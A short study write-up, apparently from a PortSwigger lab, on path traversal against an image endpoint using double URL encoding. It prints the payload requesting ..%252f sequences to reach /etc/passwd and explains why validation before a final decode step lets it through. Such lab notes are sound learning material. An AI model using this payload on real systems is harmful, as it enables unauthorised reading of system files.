# PortSwigger 04 - Superfluous URL Decode / Double Encoding

## What I tested

I tested an image-loading endpoint where normal traversal and single URL encoding did not work.

## What I found

Double URL encoding worked:

```http
GET /image?filename=..%252f..%252f..%252fetc%252fpasswd
```

## Why it matters

`%252f` decodes first to `%2f`, then to `/`.

```txt
%252f -> %2f -> /
```

After two decode steps, the payload becomes:

```txt
../../../etc/passwd
```

## Root cause

The application likely validated or filtered input before a later decoding step created a valid traversal sequence.

## Impact

An attacker could bypass earlier validation and access sensitive files.

## Note to self

Encoding bugs often come from validation happening before the application's final decode step.
